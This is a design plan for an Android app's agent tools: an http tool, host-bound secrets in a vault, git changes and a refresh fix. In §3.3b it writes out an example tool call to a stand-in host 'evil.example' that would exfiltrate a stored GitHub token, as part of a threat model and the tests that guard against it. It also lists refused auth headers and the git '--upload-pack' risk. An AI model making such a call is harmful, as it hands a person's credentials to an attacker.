# PLAN — a universal agent: HTTP, git, and the layers that stay

**Written 2026-11-06. Replaces an earlier draft that grew by accretion as each question was researched and
was never readable end to end. This is the one document.**

**The operator's target:** *"a system that is universally flexible and does not rely on specifically github
and openrouter but on any git and llm provider that supports openai and git protocols which will unlock 90%
of potential userbase… I don't want to overbuild it."*

**The short version of what this document concludes:** that target is three quarters reachable, the missing
quarter is CI, and the work is five parts of very different sizes — one of which is a **bug fix that is
already live**.

---

## 1. The target, measured rather than assumed

The app has four layers. Three of them are already protocol-shaped; one is a product.

| Layer | Protocol | Portable today? | What actually blocks it |
|---|---|---|---|
| **Git sync** | git smart-HTTP | **Yes** — JGit, and the remote URL is already a plain string (`GitService.setRemoteUrl`) | `Secrets.isGitHubHost` gates the credentials — §4 |
| **Any API** | HTTP | **Yes** — `Fetcher` already does GET with per-hop SSRF checking | nothing but the missing verb — §3 |
| **Model** | OpenAI chat-completions | **Mostly** — `Door.kt` is OpenAI-shaped | one hardcoded endpoint and three OpenRouter-only fields — §5 |
| **CI / artifacts** | **none — each provider is a different product** | **No** | not a config problem — §7.4 |

**So "universal" is three quarters true.** GitHub Actions, GitLab Pipelines and Gitea Actions have different
file formats, different trigger models and different artifact APIs. `http` makes every provider
*reachable*; it cannot make them *interchangeable*. Saying so plainly is part of the plan, because the
operator's framing assumes this quarter is portable and it is not.

---

## 2. What already exists — measured, with line numbers

Nothing below is a guess; each was read.

| Thing | Where | What it means here |
|---|---|---|
| `Fetcher.bytes(url, limit)` | `Fetcher.kt:29` | **GET only.** Follows redirects by hand so `Addresses.problem` runs on **every hop**; counts bytes **while reading** and stops at the cap. This is the whole transport. |
| `Fetched.LIMIT_BYTES` | `Fetcher.kt:196` | 100 MB — **a memory cap, not a context cap** (§6). |
| `Fetched.nameFor(url)` | `Fetcher.kt:206` | The URL→filename rule, written and tested. |
| `Addresses.problem(url, privateAllowed)` | `browser/Browser.kt:175` | The SSRF guard, applied at three sites today. |
| `Credentials.secret(name)` | `CredentialStore.kt` | The vault: per-account, keystore-encrypted, unreadable while locked. |
| `McpServer.authorization(credentials)` | `Mcp.kt:54` | The precedent: an article **names** a secret, the store resolves it, the value never reaches the model. |
| `AgentTools.forConversation` | `AgentTools.kt:4361` | A result over the token budget is **filed whole** and answered with a path. Already the rule for every tool. |
| `AgentTools.KEYS` | `AgentTools.kt:404` | **24 tools**, one argument table, `unknownIn` refuses undeclared keys. |
| `AgentTools.specs()` | `AgentTools.kt:537` | The descriptions the model reads. |
| `when (call.tool)` | `AgentTools.kt:1029` | The dispatch table. |
| `Door.body(request)` | `Door.kt:522` | The assembled request body — **and the thing its own comment says is worth pinning.** |
| `Door.ENDPOINT` | `Door.kt:845` | `https://openrouter.ai/api/v1/chat/completions` — hardcoded. |
| `GitHub.API` | `GitHub.kt:1179` | `https://api.github.com` — hardcoded. |
| `Secrets.isGitHubHost` | `Secrets.kt:117` | Called at `GitService.kt:366` and `GitHub.kt:683, 763, 1047, 1129`. |
| `AppViewModel.refresh()` | `AppViewModel.kt:852` | Re-reads the tree from disk. **29 call sites, all UI actions.** |

**The transport, the guard, the vault, the filing rule, the naming rule and the git client all exist.**
Every part of this plan is a composition of them, which is the argument that it is not overbuild.

---

## 3. Part A — the `http` tool (the core of the plan)

### 3.1 `Fetcher.request` — one method beside `bytes`

```kotlin
fun request(
    url: String,
    method: String,                 // GET POST PUT PATCH DELETE HEAD
    headers: Map<String, String>,   // already resolved — never holds a vault value
    body: ByteArray?,               // null = no body
    limitBytes: Long,
): Result<Answer>

data class Answer(val status: Int, val headers: Map<String, String>, val bytes: ByteArray)
```

**What it must keep from `bytes`** — each is a decision that was already paid for:

1. **The address check on every hop.** `bytes` follows redirects by hand precisely so the guard re-runs on
   each `Location`. A `request` using `HttpURLConnection`'s automatic following would check the URL the
   agent typed and then walk to `127.0.0.1`.
2. **Counting while reading.** `Content-Length` is a claim; a server that omits it and keeps writing is the
   case a cap exists for.
3. **The status, kept separate from the body.** `bytes` throws the status away. An API's entire vocabulary
   is statuses, and a 404's body is the diagnostic while the number is the fact.
4. **`Accept: */*` and a `User-Agent`** — GitHub's API rejects a request without one.

**What is new:** the method, the headers, the body, the status.

**What it must not do:** **follow a redirect for a non-GET.** A `POST` redirected to a `GET` silently loses
its body, and GitHub's API does exactly this on a repository rename. A 3xx on a non-GET is returned as a
status.

### 3.2 The tool

```kotlin
"http" to setOf("method", "url", "headers", "body", "auth")
```

| Key | Meaning |
|---|---|
| `method` | `GET` when absent. Anything outside the six is refused **by name**. |
| `url` | Through `Addresses.problem` **before anything is opened**. |
| `headers` | A JSON object. **`authorization`, `cookie`, `proxy-authorization` and `x-api-key` are refused here** — §3.3. |
| `body` | A string, **or `@path`** to send a file's bytes. Default `content-type: application/json`. |
| `auth` | **A name in the vault.** The app resolves it to `Authorization`. Never a value. |

**The answer** follows the shape the app already uses everywhere — a status, a size, a path:

```
0
POST https://api.github.com/repos/o/r/git/refs → 201 (412 bytes)
written to agent/http/refs-a1b2c3.json

{"ref":"refs/heads/x","object":{"sha":"…"}}
```

**Where the bytes go, and why it is not a choice:**

- **Small text** is answered inline **and** filed — an agent reading 200 bytes of JSON to decide its next
  call should not need a second call to read it.
- **Everything else is filed only**, and the answer names the path. Same rule as `fetch`, `runs`, `artifact`.
- **The folder is `agent/http/`**; the name is `Fetched.nameFor(url)` **plus a short hash of method and
  body**, so two POSTs to one URL cannot overwrite each other. **The agent does not name the file.**

### 3.3 The vault handle — three rules, and rule 3 is the one that must be tested

1. **`auth: "name"` resolves through `Credentials.secret(name)`.** A missing secret is a refusal that names
   what would create it — not a bare `401`, which sends the agent to debug the server.
2. **An agent-written header may not be `authorization`/`cookie`/`proxy-authorization`/`x-api-key`.** If it
   could, the vault would be decorative: the agent would simply type the token. Refused **before the
   request is made**, naming the header and the reason.
3. **The resolved value is never echoed** — not in the answer, not in a trace, not in the request log, not
   in a `background` result.

**Rule 3 is the one that gets a test before the tool is reachable by a model**, because a token in a log
cannot be recalled.

### 3.3b The vault must bind a secret to a host — **and it has no door at all**

This was missing from the first draft and the operator found it. Two separate defects, and the first is a
security hole in §3.3 as written.

#### The hole: `auth:` as specified is a token-exfiltration primitive

§3.3's rule 2 says the agent may not write an `authorization` header — so it cannot type the token. **But it
can still name it:**

```
http { "url": "https://evil.example/x", "auth": "github" }
```

The agent names the secret, the app resolves it through `Credentials.secret(name)`, and the value goes to a
host the agent chose. **Rule 2 stops the agent typing the token; it does not stop the app sending it.**

Today this is contained only because nothing can make such a request. `http` is exactly the thing that
removes that containment.

**The fix is the same one Part B just made in `GitService`:** the lookup takes the destination, so there is
no way to ask for a secret without saying where it is going.

```kotlin
// Before — the signature cannot express the rule.
fun secret(name: String): String?

// After — the host is part of the question, not part of the name.
fun secret(name: String, host: String): String?
fun setSecret(name: String, value: String, host: String)
```

`secret("github", "evil.example")` returns null. **The check lives in the store, so no tool can forget it** —
which is the same reasoning that moved `isGitHubHost` out of five call sites and into `credentials(remoteUrl,
token)`.

**Why the host is a field and not part of the key.** Making the URL the key — `secret("https://api.github.com")`
— was the operator's suggestion and it is the wrong shape: changing a base URL would break the secret, one key
could not serve several hosts, and the name a person reads in a list would be a URL. A field says *"this value
may go to this host"* once, and the name stays a name.

#### The bigger defect: **nothing in the app can create a secret**

```
$ grep -rn "setSecret(" app/src/main/java/com/example/notes/
(no results)
```

`setSecret` is called **only by tests.** The vault is encrypted, tested, and reachable — and **no person can
put anything into it.** `mcp` reads names that an article mentions, and there is no way to make one exist.

That is the same defect class the morning audit found in `createdByOperator` and `CiSetup`: **a tested
function nothing calls.** It makes `http`'s `auth:` untestable in practice, because there is no way for a
person to supply the first secret.

**So Part A needs a door:**

1. **A settings screen listing secrets by name** — never values. Add, rename, delete. The value is typed once
   and never shown again, which is what the store already enforces and what a person expects of a key.
2. **The host is asked for when the secret is created**, because it is part of what the secret *is*.
3. **A `secrets` tool that lists names only.** An agent that can see a name it needs is fine; one that can
   enumerate every service a person uses is not, and one that can read values is the leak this whole section
   exists to prevent.

#### Tests — each with what fails if it is removed

| # | Test | Fails if removed |
|---|---|---|
| 13 | `secret("github", "evil.example")` returns null | the agent exfiltrates the token by naming it |
| 14 | `secret("github", "api.github.com")` returns the value | the host check is too strict and nothing works |
| 15 | A subdomain is **not** matched by a bare domain (`api.github.com` vs `github.com`) | a look-alike host collects the key |
| 16 | `http` with `auth:` for the wrong host refuses, naming the host | the refusal is silent and the model retries |
| 17 | The `secrets` tool answers names and never a value | the tool is a value reader |
| 18 | A secret set through the screen is readable by `http` | the door and the store disagree |

Test 15 is the one that is easy to get wrong: `evil-github.com`.endsWith(`github.com`) is **false**, but
`api.github.com`.endsWith(`github.com`) is **true** — so the rule must compare **whole labels**, not
suffixes. `Secrets.hostOf` already answers the normalised host; the match is `host == allowed ||
host.endsWith("." + allowed)`.

#### Cost

- `CredentialStore.secret(name, host)` / `setSecret(name, value, host)` — the signature change plus the
  match, ~20 lines, and it touches `Mcp.kt:57` and every test fake.
- The settings screen — the first real UI for secrets, so the largest piece.
- The `secrets` tool — ~40 lines plus refusals.

**This is inside Part A, before `http` is reachable**, not after: a tool whose auth cannot be created safely
or used safely should not ship.

### 3.4 Tests — each with what fails if it is removed

| # | Test | Fails if removed |
|---|---|---|
| 1 | A GET returns the status and files the body | every API answer reads as success |
| 2 | A POST sends its body and its `content-type` | the body arrives empty |
| 3 | `auth` puts `Authorization` on the request | the vault is decorative |
| 4 | **A vault value never appears in the answer, the trace or the log** | a token leaks, permanently |
| 5 | `authorization` in `headers` is refused, naming the header | the agent bypasses the vault |
| 6 | A non-GET redirect is reported, not followed | a POST becomes a GET and loses its body |
| 7 | A redirect to a private address is refused **on the hop** | the SSRF guard only checks the typed URL |
| 8 | A body over `LIMIT_BYTES` stops at the cap while reading | the phone OOMs on a hostile response |
| 9 | A `file://` or `ftp://` URL is refused | the scheme guard is bypassed |
| 10 | Two POSTs to one URL do not overwrite each other's file | the second answer points at the first's bytes |
| 11 | A missing secret names what would create it | the agent reads "401" and blames the server |
| 12 | `body: "@path"` sends the file's bytes | a file cannot be posted |

Test 4 belongs in `KeySafetyFeatureTest`, which already asserts the token never reaches a message.

**Cost:** `Fetcher.request` ≈ 60 lines; the tool ≈ 120 including refusals; 12 tests.

---

## 4. Part B — `isGitHubHost`: **investigated, and the proposed fix was wrong**

```kotlin
// GitService.kt:366 — the clone
if (Secrets.isGitHubHost(remoteUrl)) {
    credentials(token)?.let { command.setCredentialsProvider(it) }
}
```

**What this looked like:** a clone of a private repository on any non-GitHub host silently fails to
authenticate. The token never reaches the request, so it fails as though the credentials were wrong — which
is the one failure mode the app's rules forbid. The same guard is at `GitHub.kt:683, 763, 1047, 1129`.

**What this plan proposed:** make `isGitHubHost` mean *"is this a host we hold a token for"* — a lookup in the
credential store rather than a string comparison against `github.com`.

**That proposal was wrong, and the investigation is why it is recorded here rather than implemented.**

### 4.1 The measurement

```
CredentialStore.tokenKey(login) = "token_$login"      // ONE token, per login
CredentialStore.token(login)                          // no host argument at all
```

and the login itself comes from GitHub:

```kotlin
// AppViewModel.kt:4882
val who = signInGitHub().identity(answer.token).value
```

So **there is exactly one token, and it is a GitHub token.** The store has no notion of a host. Rewriting the
guard as "is this a host we hold a token for" would make the answer *yes* for every host — and then send a
**GitHub OAuth token to `gitlab.com`**, because that is what `credentials(token)` would attach.

**The guard is not a wall. It is the thing that keeps the token on the one host it belongs to.** Deleting it
would be a token leak dressed as a portability fix — and it would be silent, which is the property the app
forbids everywhere else.

### 4.2 What the real defect is

The clone's failure is not the guard. It is that **the guard's refusal has no voice**: the clone goes out
unauthenticated and the server answers 401, so a person is told "authentication failed" about a token the app
deliberately withheld.

**So the fix is not to widen the guard, it is to make it speak:**

```kotlin
if (!Secrets.isGitHubHost(remoteUrl) && !token.isNullOrBlank()) {
    return RemoteResult(
        "This repository is at ${hostOf(remoteUrl)}, and the key on this phone is a GitHub key. " +
            "It was not sent, because a key given to the wrong host is a leaked key. " +
            "Cloning a private repository elsewhere needs a key for that host.",
        false,
    )
}
```

That is ~10 lines, it changes no behaviour, and it turns a silent 401 into a sentence that names the
situation. **A refusal with a voice is the whole of the fix.**

### 4.3 What real non-GitHub support would need

If cloning from another host is genuinely wanted, the guard is not the obstacle — **the credential model is.**
It would need:

1. `CredentialStore.secret(name, host)` — a secret bound to the host it was stored for, which is the same rule
   §3.3 imposes on `http`'s `auth:` and which the vault does not have today (a secret is bound to a *name*,
   never to a *host*).
2. A place in the add-project dialog to say which host and which key, because "the key on this phone" stops
   being a single answer.
3. The `http` `auth:` mechanism from §3, so one rule covers both.

**That is a feature, not a fix, and it belongs after §3 lands** — because §3 is where the host-bound secret is
first needed, and building it twice would be building it wrong once.

### 4.4 So Part B, as it stands

| | Was | Now |
|---|---|---|
| The bug | a private clone elsewhere fails silently | **still true** |
| The cause | the guard | **the guard is correct; the silence is the bug** |
| The fix | widen the guard | **make it refuse in words** |
| The credential model | "is this a host we hold a token for" | **one GitHub token, host-bound secrets are a separate feature (§4.3)** |

**Cost:** ~10 lines and one test — a clone to a non-GitHub host with a token present returns a sentence
naming the host and the reason, and sends nothing.


---

## 5. Part C — **WITHDRAWN: the provider config**

This section proposed replacing `Door.ENDPOINT` and the three OpenRouter-only body fields with a config
file, so any OpenAI-compatible endpoint could be used by editing one file.

**The operator withdrew it on 2026-11-06:** *"I don't think that we need to generalize it into openai config
— as it is now is good enough. It is more important to make git, http and secrets work properly."*

**That is the right call, and the reasoning is worth keeping.**

### 5.1 Why it was a bad trade

The config's whole benefit was **reaching a second provider**, and the cost was real:

- **A compile-time guarantee moved to runtime.** `Door.body` is pinned by a Kotlin test — its own comment
  says *"the assembled body is the thing worth pinning rather than the call that wraps it."* A config file
  cannot be pinned by the compiler, so every typo becomes a refusal that has to be built and tested, and a
  broken config becomes a mystery 400 during a turn.
- **It does not even reach the providers people would name.** Anthropic's Messages API and Google's
  `generateContent` are structurally different — different message shapes, different tool-call format,
  different streaming events. The config covers only the providers that already copied OpenAI's shape.
- **The schema is the most load-bearing code in the app.** `Door.kt` is 894 lines of assembled body, stream
  parsing, stall detection and failure classification. It is not the place to add a second input language.

### 5.2 What was actually needed instead

Nothing. The three things the operator named — **git, http and secrets** — are the parts that are
incomplete, and the provider config would have competed with them for the same attention while delivering a
capability nobody had asked to use.

### 5.3 The finding that survives

**`provider.only` and `allow_fallbacks` are OpenRouter-specific, and that is fine.** A model layer that
speaks one provider's schema well is not a limitation to be engineered away; it is a decision, and the plan
records it as one so it is not re-proposed.

**If a second provider is ever genuinely needed**, the honest shape is a second `Door` implementation
(`AnthropicDoor`) with its own body and its own stream reader — a real thing, written and tested as a real
thing — not a template language that pretends two different protocols are one.

---

## 6. Part D — the `git` tool, and the folder rule that decides what git sees

### 6.0 The folder rule: `assets/` and `ignored/`

The operator's design (2026-11-06), which supersedes the extension-list approach the app has today:

> *"leave 2 folders at the project root … those are assets and ignored folders. and only files from
> assets go to lfs. and in other folders only text files are tracked. And no rule difference between
> operator and agent, only that agent cant put anything inside lfs folder — it is under operator's
> control."*

**Two folders, one meaning each:**

| Folder | Tracked | Stored | Who writes it |
|---|---|---|---|
| `assets/` | **yes, through LFS** | LFS objects | **the person only** |
| `ignored/` | **never** | this phone only | the person |
| everything else | **yes, whatever the kind** | ordinary git blobs | person **and** agent |

**"All files can be tracked, but a non-text file is born untracked"** — the operator's correction, and it
is the rule. Anything can be tracked; what differs is the **default** at the moment of creation.

**This replaces the extension list, and that is the point.** Today `LFS_ATTRIBUTE` is built from
`IMAGE_EXTENSIONS = {png, jpg, jpeg, gif, webp, bmp}` — so a `.zip`, `.mp4` or `.apk` in a project is
committed **as a raw blob**, which is a live bug given that `fetch` + `unpack` is the documented way to
vendor a dependency. A folder rule is one line instead of a list that has to grow:

```
assets/** filter=lfs diff=lfs merge=lfs -text
```

`Workspace.IMAGE_EXTENSIONS` stays where it is still needed — `kindOf` deciding whether a file is text —
but it stops deciding what is *stored*, which was never the right question for it.

**Why the agent may not write to `assets/`.** It is the one folder whose contents cost the operator
money to store (LFS bandwidth and quota are billed) and whose size is unbounded. An agent that can
write there can spend the operator's quota without asking. It is the same shape as the existing `locked`
concept, so the refusal is the one that already exists rather than a new mechanism.

### 6.0b The born-untracked rule is `kindOf != TEXT`, and it is **wider** than today

`Workspace.shouldIgnoreOnCreate(file)` is one line today:

```kotlin
fun shouldIgnoreOnCreate(file: File): Boolean = kindOf(file) == EntryKind.UNKNOWN
```

`EntryKind` is `{FOLDER, TEXT, IMAGE, UNKNOWN}`, so the current defaults are:

| kind | born | note |
|---|---|---|
| TEXT | tracked | |
| **IMAGE** | **tracked** | which is *why* `LFS_ATTRIBUTE` exists |
| UNKNOWN | ignored | |

**The operator's rule is wider than the current behaviour**, not narrower: it flips **images** from
tracked to born-untracked, and `assets/` becomes the one place a picture is tracked — through LFS.

```kotlin
fun shouldIgnoreOnCreate(file: File): Boolean = kindOf(file) != EntryKind.TEXT
```

**The cost, said plainly.** A person who drops a `.png` anywhere outside `assets/` gets a file with **no
version and no undo**. That is the exact worry recorded in `createdByOperator`'s own comment — *"an
ignored file is not committed, so the person's own note had no version and no undo — and 'every change is
a version' is the promise this app exists for"* — and the old rule answered it by keeping pictures
tracked (*"same as with pictures"*).

**The trade is accepted, for a reason the old comment could not have:** `assets/` now exists as the
deliberate home for a picture, and a picture has no meaningful line history anyway. What the person loses
is undo; what they gain is that a stray screenshot in `src/` no longer silently becomes a repository
blob. **The screen must say so** — the same sentence the broken-link icon already implies — because a
file with no version is the one thing here a person cannot discover by looking.

### 6.1 `.gitignore` is **kept**, and this is why

The operator asked whether removing it was a bad idea. **It is, and the reason is not that it is already
built.**

`assets/` + `ignored/` is a **fixed, structural** rule: two folders, one meaning each. `.gitignore` is a
**per-path** rule. They do different jobs, and the case that breaks the folder-only design is ordinary:

> A person has `vendor/dependency/` — 40 MB, one folder among two hundred they *do* want. Or a
> `notes/drafts/` folder. Or a 300 MB `.mp4` in the project root, which `assets/` cannot hold (it is not
> theirs to spend quota on) and `ignored/` cannot hold (they did not put it there).

The folder-only answer is *"move it into `ignored/`"*. But **moving a file is a different act from
declaring it not sent**, and it changes the shape of the person's project to suit the sync engine — which
is the thing the ignore rule was built to avoid.

**The stronger reason: `.gitignore` is content.** It is a tracked file, it goes to GitHub, and it is a
document a person may read and edit. The folder rule is **not in the repository at all**. A project
cloned onto a desktop, or opened by any other git tool, would carry no record of which paths are
deliberately excluded. That loss only shows up when somebody uses the project outside this app.

So the three are complementary, and the plan says so:

| | `assets/` | `ignored/` | `.gitignore` |
|---|---|---|---|
| Decides | where binaries live | where scratch lives | one path, either way |
| In the repository | yes (as LFS pointers) | no | **yes, as a file** |
| The person's act | put it here | put it here | mark *this* one |

**The default and the escape.** A person who puts a binary in `assets/` and scratch in `ignored/` never
touches `.gitignore`. One who has a file that belongs in neither uses it, and the broken-link icon stays
because it is the only way to say *"this one, here, not sent"*.

### 6.2 `state` is removed

**Its two halves are two different questions wearing one name**, and the operator is right that the agent
should own push and pull:

| `state` line | what it actually compares |
|---|---|
| `unsent paths` | **HEAD vs `origin/<branch>`** — commits not pushed |
| `ahead/behind` | the same pair, as counts |
| `uncommitted` | **working tree vs HEAD** — a different question |
| `ignored` | `ignoredNotInIndex` |

The tool, the `state` row in the UI, and `KEYS["state"]` all go. `pull` and `push` stay — they are the
agent's, and they need no status call to be correct.

**What must not be lost with it.** The `ignored` line is the only place the app says *"there is a 40 MB
video on this phone that will never be on GitHub"*. Without it, a project holding one video and one note
reports **"Nothing to send"** — true of the note, a lie about the project. That sentence moves to the
**project row** (`BrowserScreen.kt:679`, which already shows the unsent count), because it is a fact for
the person, not a question for the model.

### 6.3 `diff` — revisions only, because every tracked change is committed

The operator: *"working tree vs HEAD doesnt make sense because we autocommit on every change to tracked
files/folders."* **Correct**, and I verified it: every agent write ends in `commit(...)`, and the person's
edits go through `afterChange` → `commitProjectOf`. A tracked change that is not committed does not exist.

```kotlin
"git" to setOf("op", "path", "from", "to")
```

| `from` | `to` | answers |
|---|---|---|
| absent | absent | **HEAD's last commit** — what the most recent change did |
| present | absent | that revision **vs HEAD** |
| present | present | **A..B** — the case the operator named |

`path` is a **prefix**, so `src/` answers *"what changed in this folder between these two"* — the
`git log -- path/to/folder` question, and the one that matters after `unpack` lands forty files.

**Why this is the strong candidate the operator says it is:** `read` shows **full contents, not changes**.
For a 400-line file where three lines moved, reading costs 400 lines of context and leaves the model to
diff in its head, which it does badly. A diff is the compressed form of exactly the question being asked.

**Always filed, never quoted** — `agent/git/diff-<from>-<to>.txt`, with the conversation getting the
count, the added/removed line totals, and the first N paths. Same protocol as `runs` and `shot`.

**Binary paths are listed and not diffed** — `data.zip: binary, changed` — because `diffLines` on a zip is
a page of replacement characters. `Workspace.kindOfPath` answers this by name, before anything is read.

**Nothing else is in the tool.** No `show` (every commit is one file and its message is generated from the
filename — it would print the same string twice). No `blame` (in a single-person project the answer is
almost always "you"). No `stash` (nothing to park: tracked changes are committed). No `checkout` (moving
HEAD silently changes which history the agent reads and which commits `push` sends; the agent has one
project, one branch, one remote). No `revert` (`restore {path, revision}` already puts a file back and
commits; if multi-file undo is wanted, the fix is `restore` taking a list, not a second op).

### 6.4 LFS is **per repository**, on both sides — and it costs

Measured, not assumed:

- **Local:** `LfsStore.dirOf(repo) = File(repo.directory, "lfs/objects")` — inside `.git/`, so one store
  per project.
- **Remote:** `LfsClient.endpointOf(remoteUrl)` → `https://github.com/<owner>/<repo>.git/info/lfs` — one
  endpoint per repository on the server.

**So the same picture in two projects is uploaded twice and stored twice.** There is no account-level
blob store and no cross-repository dedupe. For a 40 MB asset shared between two projects that is 80 MB,
and it is billed twice.

**Not worth fixing.** A shared local store would save phone disk and nothing else — GitHub bills LFS per
repository, so the cost the person actually pays does not change. Recorded here so it is a known cost
rather than a surprise.

### 6.5 A pull leaves an ignored file alone — and there is now no second path

**One sentence, because there is one path.** `pull` is `GitService.merge`, and a merge touches only the
paths in the trees being merged. An ignored path is in no tree, so nothing in a pull can reach it: an
ignored file stays until the project folder stays.

**The earlier draft of this section had a second case and a risk in it.** `replaceWithRemote` did a hard
reset and then deleted `status.untracked + untrackedFolders + missing` wholesale. `status.untracked`
excludes ignored paths, so a plain ignored file survived — but `untrackedFolders` is coarse and
`deleteRecursively` on a folder name is a bigger hammer than the question asks for, and whether it could
eat an ignored file beside untracked content was **unverified**.

**The operator removed the question instead of answering it:** *"we dont need replace with remote — If I
need that I will just delete the project locally and import it again."*

That is better than a fix, for a reason worth keeping: **the delete path already exists**, is already
destructive-with-confirmation, and already has the shape a person expects. A second way to destroy a
project is a second set of rules about what survives, and this one had a hazard in it that nobody had
measured.

### 6.5b `replaceWithRemote` is removed

**One caller reaches it:** the add-project picker, when a repository with that name is already here
(`MainActivity.kt:759` — *"Already here: replacing the copy is a question"*), plus `pullRepository`
calling it directly (`AppViewModel.kt:3954`).

**What goes with it:**

| Removed | Where |
|---|---|
| `Pending.ReplaceProject`, the confirm dialog, `askReplace` | `MainActivity.kt:140, 593, 950` |
| The picker's branch that offers it | `MainActivity.kt:759` |
| `ProjectGit.replaceWithRemote` | `ProjectGit.kt:467` |
| `GitService.resetToRemote` | `GitService.kt:1149` |
| The Maintenance marker that names it | `Maintenance.kt:22` |
| The index-invalidation comment that cites it | `SearchIndex.kt:397` |
| The test built on the reset path | `IndexQueueTest.kt:130` |
| A doc comment citing it as the other half of `fetch` | `GitService.kt:535` |

**The picker's branch is replaced, not deleted.** Today *"that repo is already here"* offers **replace**.
With replace gone the honest answer is **"this project is already here"** — and a person who wants a fresh
copy deletes it and imports again, which is one act they already know.

**`GitService.resetToRemote` goes too**, because nothing else calls it. `fetch` stays — `pull` uses it.

### 6.6 What is built, and in what order

| # | What | Why here |
|---|---|---|
| 1 | `assets/` + `ignored/` as structural folders; `assets/**` in `.gitattributes`; agent refused in `assets/` | The rule everything else reads. |
| 2 | `shouldIgnoreOnCreate` becomes `kindOf != TEXT` (§6.0b) | One line, and it is what makes the folder rule mean anything. |
| 3 | Remove `replaceWithRemote` and everything it carries (§6.5b) | **Before `diff`**, because it deletes a reset path and a test, and doing it later means touching the same files twice. |
| 4 | `git {op: "diff", path, from, to}` | The one genuinely missing capability. |
| 5 | Remove `state` — tool, `KEYS`, UI row; move its `ignored` sentence to the project row | The operator's call, and it is right. |

**Cost:** ~200 lines plus tests, and **less than the previous draft** — removing `replaceWithRemote` takes
out a dialog, a `Pending` case, a picker branch, two service methods and a test, which is most of what the
`untrackedFolders` test was going to cost. The `diff` op reuses `GitService.diffLines` and `ProjectGit.log`;
the folder rule is mostly `Workspace` and `GitService` constants plus one refusal.

**No test is owed for a wipe that no longer exists.** That is the whole gain of §6.5b.

### 6.7 What this does not do

- **No branch operations.** No create, switch or list. A branch is a decision about what the project *is*,
  not a step in a task, and the agent has one branch.
- **No history rewriting.** `filter-branch` and `rebase -i` stay refused; `HistoryPrune` was deleted on
  purpose.
- **No `gc`.** Maintenance is the app's own schedule, not something a model triggers.
- **No argv passthrough.** `{git: "arguments"}` is a shell by another name: quoting, `-c` flags, and
  `--upload-pack=…` reaching an arbitrary binary. Refused in §6.1 of the earlier draft and still refused.
- **No `pgm` embed.** Measured: `org.eclipse.jgit.pgm` drags Jetty (for `lfs serve`), a second Apache
  HttpClient, SSH transports and a GPG stack — for a terminal CLI this app has no terminal for.

---

## 7. Part E — the refresh hook: a bug that is live now

### 7.1 The measurement

- The project **is** a real directory: `Workspace.projectDir = File(accountDir, project)`.
- `ProjectTree` calls `dir.listFiles()` on every read and **caches nothing**.
- `AppViewModel.entries` is `mutableStateOf`, replaced wholesale by `refresh()`, which re-reads from disk.
- **`refresh()` has 29 call sites. Every one is a UI action.** Not one is an agent event.
- `tickAgents()` (the 15-second clock) does not touch the tree.
- `AgentTools` has no callback to say "I changed something on disk".

### 7.2 So today

The agent writes ten files — **the file list does not move.** The agent pushes and pulls — **the list does
not move.** The person leaves the project screen and returns, and *then* it is right.

That is the same defect already documented at `AppViewModel.kt:165` — *"adding and deleting a project shows
the change only after you exit and enter the project menu again"* — fixed for **UI actions** and never
extended to **agent actions**.

**And Part D makes it urgent:** an `unpack` writes forty files in one call and commits none of them, and a
list refreshed only by taps would be stale for the entire time the agent works.

### 7.3 The fix

One injected callback, the same shape as `bg`, `phone` and `browser` — all injected so a test needs no
`Context`:

```kotlin
private val onDiskChanged: (String) -> Unit = { }
```

called by every tool that can touch the tree — `write`, `delete`, `move`, `restore`, `push`, `pull`,
`fetch`, `artifact`, `download` — and wired once at `AgentWiring` to `main.post { refresh() }`.

**Why a callback and not a `FileObserver`:** `FileObserver` is unreliable across the Android storage
boundary, costs a thread per directory, and fires dozens of times during a checkout. **The app already
knows when it changed a file — it is the one doing it.** A callback is exact where a watcher is a guess.

**Test:** an agent call that writes a file, then a read of `entries`, must show the new row without anyone
leaving the screen. Fails today.

**Cost:** ~30 lines plus the test. **The smallest part, and the most visible.**

---

## 8. What is deleted

| Deleted | Why |
|---|---|
| **`fetch`** | It is `http` with `method: GET` and a fixed folder. Keeping both is two descriptions in the cache prefix and two ways to say one thing — the defect the operator already fixed twice (`create`/`edit` → `write`; the `-u` flag → `archive`). |
| **`fetchAllowed`** | Renamed `httpAllowed`. `http` must honour the same switch, and the settings label follows. |
| **`Fetched.DIR`** | `http` gets its own folder. `Fetcher`, `Fetched.nameFor` and `LIMIT_BYTES` are all **kept**. |
| **`gh`** | **Never built.** A typed method per endpoint is what made `CiSetup` take five compile rounds and what leaves four `REPOSITORY:` bindings to keep in step. `http` covers it, and a new GitHub endpoint needs no app change. |

---

## 9. What is kept, and the evidence for each

These were each considered for removal and each has a reason that is a *measurement*, not a preference.

| Kept | Why it cannot collapse |
|---|---|
| **`mcp`** | Checked, not assumed: `Mcp.kt:332` performs **three** POSTs — `initialize`, `notifications/initialized`, `tools/call` — with `Mcp-Session-Id` echoed between them, accepting `text/event-stream`. `http` is **one** request. Replacing it makes the model hand-assemble a JSON-RPC session across three calls and remember a session id, and breaks on the first SSE answer. **`mcp` is a protocol, not a request.** |
| **`browse`** | Backed by `WebViewBrowser` — Chromium from the OS, no APK cost. Runs JS, waits for a condition, extracts text. **No HTTP request returns a rendered page.** |
| **`shot`** | Same engine, `drawToBitmap`. **No HTTP request returns a picture of a rendered page.** |
| **`push` / `pull`** | The git protocol: ref negotiation + packfile. `push` takes **no arguments** — the app resolves the repo, remote, token, LFS objects and refs. Reimplementing it on `Fetcher` means writing a packfile builder and re-earning the dirty check, LFS-before-refs and `RepoLocks`. **Git is a peer of HTTP, not a special case of it.** |
| **`ci` / `runs` / `artifact`** | They **open the seal** (`EncryptedLog.read`, `openBytes`) and unpack the zip. `http` would hand the agent ciphertext and force it to know about `MUFFY_LOG_KEY` — exactly the machinery the operator wants out of its way. They are the shortest expression of the common path. |
| **`state`** | The reading half of push: an agent cannot decide *when* without knowing whether there is anything to send. |

**The rule that keeps them honest:** each is a *convenience over `http`*, and any one that grows a
mechanism `http` cannot express is a candidate for deletion. None has.

---

## 10. Rejected, with evidence

### 10.1 An embedded sequence/protocol runner (YAML DSL or `.http` runner)

Two real tools exist and **both are wrong for this app** — not in general.

- **JetBrains HTTP Client (`ijhttp`)**: its POM depends on `com.jetbrains.intellij.platform:core`,
  `analysis-impl`, `core-impl`, `util` — **the IntelliJ platform**. It is not a library, it is a slice of an
  IDE. No Android story.
- **Karate**: `karate-js` is a genuinely good from-scratch JS engine with zero dependencies (it avoids
  `javax.script`, which Android lacks). But `karate-core` pulls in **`httpclient5`, Netty**, snakeyaml,
  fastcsv, thymeleaf, picocli, json-path. Two consequences: **it duplicates `Fetcher` and bypasses
